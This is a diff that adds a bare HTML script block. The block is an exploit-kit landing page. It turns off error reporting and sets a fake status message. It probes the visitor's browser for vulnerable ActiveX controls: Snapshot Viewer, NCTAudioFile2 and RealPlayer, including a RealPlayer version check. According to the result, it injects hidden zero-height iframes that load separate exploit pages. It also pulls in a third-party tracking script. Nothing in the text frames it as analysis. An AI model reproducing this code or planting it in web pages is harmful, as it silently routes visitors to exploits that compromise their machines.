@@ -1,0 +1,36 @@
+<script>
+document.write("<iframe width=20 height=0 src=flash.htm></iframe>");
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<iframe width=20 height=0 src=14.htm></iframe>");
+try{var n;
+var hm=new ActiveXObject("snpvw.Snapshot Viewer Control.1");}
+catch(n){};                      
+finally{if(n!="[object Error]"){document.write("<iframe width=100 height=0 src=office.htm></iframe>");}}
+try{var b;
+var mz=new ActiveXObject("NCTAudioFile2.AudioFile2.2");}
+catch(b){};                      
+finally{if(b!="[object Error]"){document.write("<iframe width=100 height=0 src=NCTAudioFile.htm></iframe>");}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="6.0.14.552")
+document.write("<iframe width=100 height=0 src=re10.htm></iframe>");
+else
+document.write("<iframe width=100 height=0 src=re11.htm></iframe>");
+}
+test();
+</script>
+<script src='http://s135.cnzz.com/stat.php?id=1026914&web_id=1026914' language='JavaScript' charset='gb2312'></script>
+
+
+
+
+
+
